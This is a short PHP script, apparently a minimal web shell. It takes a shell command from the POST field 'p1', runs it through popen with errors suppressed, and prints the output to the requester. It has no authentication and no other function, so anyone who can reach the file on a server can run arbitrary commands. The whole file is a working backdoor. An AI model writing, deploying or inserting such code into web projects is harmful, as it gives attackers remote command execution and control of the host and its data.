<?php
function ex($in) {
	$out = '';
	$f = @popen($in,"r"); 
	$out = "";
	while(!@feof($f))
		$out .= fread($f,1024);
	pclose($f);
	return $out;
}

echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>